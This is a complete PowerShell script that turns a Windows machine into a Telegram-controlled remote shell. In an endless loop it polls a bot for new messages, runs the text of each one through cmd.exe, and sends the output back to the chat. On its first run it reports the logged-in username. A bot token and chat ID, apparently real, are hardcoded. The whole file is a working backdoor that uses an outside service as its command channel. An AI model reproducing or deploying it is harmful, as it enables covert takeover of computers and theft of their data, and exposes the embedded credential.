$botToken = "8120489701:AAHigBOgidRI5DitKs_gZEwBcTssrJUWm4Q"
$chatId = "6028941420"

$baseUrl = "https://api.telegram.org/bot$botToken"

# Define the method to get updates
$getUpdatesUrl = "$baseUrl/getUpdates"

# Initialize the last processed update ID (to avoid processing the same update multiple times)
$lastUpdateId = 0

# Define the function to send command output to Telegram
function Send-CommandOutputToTelegram {
    param(
        [string]$botToken,
        [string]$chatId,
        [string]$command
    )

    $sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage"
    $maxMessageLength = 4096  # Max message length allowed by Telegram

    try {
        # Check if the command starts with 'cd' (change directory)
        if ($command.StartsWith("cd ", [System.StringComparison]::OrdinalIgnoreCase)) {
            # Extract the path to change to
            $path = $command.Substring(3).Trim()

            # Change directory to the specified path
            Set-Location -Path $path

            # Execute the rest of the command after 'cd'
            $command = $command.Substring(3 + $path.Length).Trim()
        }

        # Execute the command and capture its output
        $output = & cmd.exe /c $command 2>&1

        # If the command has output, prepare the response
        if ($output) {
            $responseMessage = Format-CommandOutput -output $output
        } else {
            $responseMessage = "Command executed successfully, but no output was returned."
        }
    } catch {
        # If an error occurs, capture the error message
        $responseMessage = "Error executing command: $_"
    }

    # Check if the message is too long and split it into chunks
    if ($responseMessage.Length -gt $maxMessageLength) {
        # Manually split the message into chunks of maxMessageLength characters, but limit to 2 chunks
        $startIndex = 0
        $chunkCount = 0
        while ($startIndex -lt $responseMessage.Length -and $chunkCount -lt 2) {
            # Get a substring of up to maxMessageLength characters
            $chunk = $responseMessage.Substring($startIndex, [Math]::Min($maxMessageLength, $responseMessage.Length - $startIndex))
            # Send the chunk to Telegram
            Send-TelegramMessage -botToken $botToken -chatId $chatId -message $chunk
            # Move the startIndex forward by the length of the current chunk
            $startIndex += $maxMessageLength
            $chunkCount++
        }

    } else {
        # Send the message in one go if it's within the size limit
        Send-TelegramMessage -botToken $botToken -chatId $chatId -message $responseMessage
    }
}

# Function to send a message to Telegram
function Send-TelegramMessage {
    param(
        [string]$botToken,
        [string]$chatId,
        [string]$message
    )

    $sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage"
    $sendMessageParams = @{
        chat_id = $chatId
        text    = $message
    }

    try {
        Invoke-RestMethod -Uri $sendMessageUrl -Method Post -Body $sendMessageParams
    } catch {
        Write-Host "Failed to send message to Telegram: $_"
    }
}

# Function to format command output
function Format-CommandOutput {
    param(
        [string[]]$output   # Command output
    )

    # Join the output lines with newline
    $formattedOutput = $output -join "`n"

    # Clean up any unnecessary command prompt artifacts or unwanted characters
    $formattedOutput = $formattedOutput.Trim()

    # Wrap long lines for better readability
    $formattedOutput = $formattedOutput -replace "(.{100})", "`$1`n"

    return $formattedOutput
}

# Initialize the variable to track the first loop
$isFirstRun = $true
$lastUpdateId = 0  # Assuming this is declared earlier to keep track of the last update ID

# Define the valid user ID for security check (replace with the actual valid user ID)
$validUserId = "6028941420"

# Initialize the variable to track the first loop
$isFirstRun = $true
$lastUpdateId = 0  # Assuming this is declared earlier to keep track of the last update ID
# Loop to continuously check for updates
while ($true) {
    # Send a GET request to get updates from the bot
    $response = Invoke-RestMethod -Uri $getUpdatesUrl -Method Get

    #$request = [System.Net.WebRequest]::Create($getUpdatesUrl)
    #$request.Method = 'GET'
    #$response = $request.GetResponse()



    # Check if there are any updates
    if ($response.ok -eq $true) {
        # Get the most recent update
        $latestUpdate = $response.result | Sort-Object update_id -Descending | Select-Object -First 1

        # If the latest update is newer than the last processed update, process it
        if ($latestUpdate.update_id -gt $lastUpdateId) {
            if ($latestUpdate.message -ne $null) {
                # Extract necessary information from the message
                $userId = $latestUpdate.message.from.id  # Extract user ID

                # Skip updates from users who are not the valid user
                if ($userId -ne $validUserId) {
                    Write-Host "Skipping update from unauthorized User ID: $userId"
                    continue  # Skip processing this update if userId is invalid
                }

                # Now that we know the user is authorized, proceed with logging the message
                $messageText = $latestUpdate.message.text
                $sender = $latestUpdate.message.from.username
                $receivedChatId = $latestUpdate.message.chat.id  # Extract chat ID
                $messageId = $latestUpdate.message.message_id

                # Log the command attempt (user and chat info, along with the message text)
                Write-Host "New message from $sender (User ID: $userId, Received Chat ID: $receivedChatId, Message ID: $messageId):"
                Write-Host "$messageText"
                Write-Host "--------------------------------------------"

                # Update the last processed update ID to the current message's update_id
                $lastUpdateId = $latestUpdate.update_id

                Write-Host "Authorized user detected. Executing command..."

                # Check if it's the first loop
                if ($isFirstRun) {
                    # Execute "echo User login" only during the first loop
                    Send-CommandOutputToTelegram -botToken $botToken -chatId $receivedChatId -command "echo User %USERNAME% login"
                    # Set the flag to false after the first loop
                    $isFirstRun = $false
                } else {
                    # Execute the custom command (from the received message) after the first loop
                    Send-CommandOutputToTelegram -botToken $botToken -chatId $receivedChatId -command $messageText
                }
            }
        }
    } else {
        Write-Host "Failed to get updates."
    }

    # Sleep for a few seconds before checking for new updates
    Start-Sleep -Seconds 5
}


